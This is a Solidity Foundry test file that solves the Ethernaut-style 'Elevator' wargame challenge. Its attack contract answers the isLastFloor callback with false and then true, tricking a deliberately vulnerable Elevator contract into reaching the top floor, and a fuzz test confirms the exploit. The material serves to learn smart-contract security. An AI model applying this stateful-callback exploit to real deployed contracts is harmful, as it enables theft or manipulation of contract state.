//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract testElevetor is Test {
    Elevator ele;
    attack att;

    function setUp() public {
        // deploy the elevator
        ele = new Elevator();
        att = new attack();
    }

    function test_attacking(uint x) public {
        vm.assume(x > 0);
        att.atack(address(ele), x);
        assertEq(ele.floor(), x);
        assertTrue(ele.top());
    }
}

contract attack {
    uint public floor;

    function isLastFloor(uint x) external returns (bool) {
        // function should return false in the first call ;
        // function should return true in the second call with the same input ;
        if (x != floor) {
            floor = x;
            return false;
        } else {
            return true;
        }
    }

    function atack(address contra, uint x) public {
        (bool ok, ) = contra.call(abi.encodeWithSignature("goTo(uint256)", x));
        require(ok, "tx.failed");
    }
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

interface Building {
    function isLastFloor(uint) external returns (bool);
}
